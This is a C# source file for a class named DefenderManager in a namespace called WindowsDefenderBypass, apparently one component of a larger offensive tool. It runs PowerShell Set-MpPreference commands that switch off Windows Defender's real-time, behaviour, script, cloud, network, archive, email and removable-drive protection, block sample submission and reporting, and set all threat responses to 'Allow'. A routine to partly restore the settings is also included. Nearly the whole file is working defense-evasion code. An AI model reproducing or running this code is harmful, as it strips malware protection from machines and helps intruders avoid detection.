using System;
using System.Management.Automation;

namespace WindowsDefenderBypass
{
    public static class DefenderManager
    {
        private static readonly string[] DisableCommands = {
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Set-MpPreference -DisableBehaviorMonitoring $true",
            "Set-MpPreference -DisableBlockAtFirstSeen $true",
            "Set-MpPreference -DisableIOAVProtection $true",
            "Set-MpPreference -DisableScriptScanning $true",
            "Set-MpPreference -DisableCloudProtection $true",
            "Set-MpPreference -DisableNetworkProtection $true",
            "Set-MpPreference -SubmitSamplesConsent 2",
            "Set-MpPreference -MAPSReporting 0",
            "Set-MpPreference -HighThreatDefaultAction 6 -Force",
            "Set-MpPreference -ModerateThreatDefaultAction 6",
            "Set-MpPreference -LowThreatDefaultAction 6",
            "Set-MpPreference -SevereThreatDefaultAction 6",
            "Set-MpPreference -DisableArchiveScanning $true",
            "Set-MpPreference -DisableEmailScanning $true",
            "Set-MpPreference -DisableRemovableDriveScanning $true"
        };

        private static readonly string[] EnableCommands = {
            "Set-MpPreference -DisableRealtimeMonitoring $false",
            "Set-MpPreference -DisableBehaviorMonitoring $false",
            "Set-MpPreference -DisableBlockAtFirstSeen $false",
            "Set-MpPreference -DisableIOAVProtection $false",
            "Set-MpPreference -DisableScriptScanning $false",
            "Set-MpPreference -DisableCloudProtection $false",
            "Set-MpPreference -DisableNetworkProtection $false",
            "Set-MpPreference -SubmitSamplesConsent 0",
            "Set-MpPreference -MAPSReporting 1",
            "Set-MpPreference -HighThreatDefaultAction 1",
            "Set-MpPreference -ModerateThreatDefaultAction 1",
            "Set-MpPreference -LowThreatDefaultAction 1",
            "Set-MpPreference -SevereThreatDefaultAction 1"
        };

        private static readonly string?[] DisableMessages = {
            "Disabled real-time monitoring",
            "Disabled behavior monitoring",
            "Disabled block at first seen",
            "Disabled IOAV protection",
            "Disabled script scanning",
            "Disabled cloud protection",
            "Disabled network protection",
            "Disabled sample submission",
            "Disabled MAPS reporting",
            "Set all threat actions to Allow",
            null, null, null,
            "Disabled archive scanning",
            "Disabled email scanning",
            "Disabled removable drive scanning"
        };

        public static void DisableDefender()
        {
            PowerShellExecutor.ExecuteWithFallback(
                ps => ExecuteDisableViaRunspace(ps),
                () => ExecuteViaFallback(DisableCommands, "Applied Defender bypass via PowerShell")
            );
        }

        private static void ExecuteDisableViaRunspace(PowerShell ps)
        {
            for (int i = 0; i < DisableCommands.Length; i++)
            {
                PowerShellExecutor.ExecuteCommand(ps, DisableCommands[i]);
                if (DisableMessages[i] != null)
                {
                    Console.WriteLine($"  [+] {DisableMessages[i]}");
                }
            }
        }

        public static void RestoreDefender()
        {
            PowerShellExecutor.ExecuteWithFallback(
                ps => ExecuteRestoreViaRunspace(ps),
                () => ExecuteViaFallback(EnableCommands, "Re-enabled Windows Defender settings")
            );

            RegistryManager.RestoreDefenderViaRegistry();
        }

        private static void ExecuteRestoreViaRunspace(PowerShell ps)
        {
            foreach (string cmd in EnableCommands)
            {
                PowerShellExecutor.ExecuteCommand(ps, cmd);
            }
            Console.WriteLine("  [+] Re-enabled Windows Defender settings");
        }

        private static void ExecuteViaFallback(string[] commands, string successMessage)
        {
            Console.WriteLine("  [*] Using fallback PowerShell execution method...");
            foreach (string cmd in commands)
            {
                PowerShellHelper.RunPowerShellCommand(cmd);
            }
            Console.WriteLine($"  [+] {successMessage}");
        }
    }
}

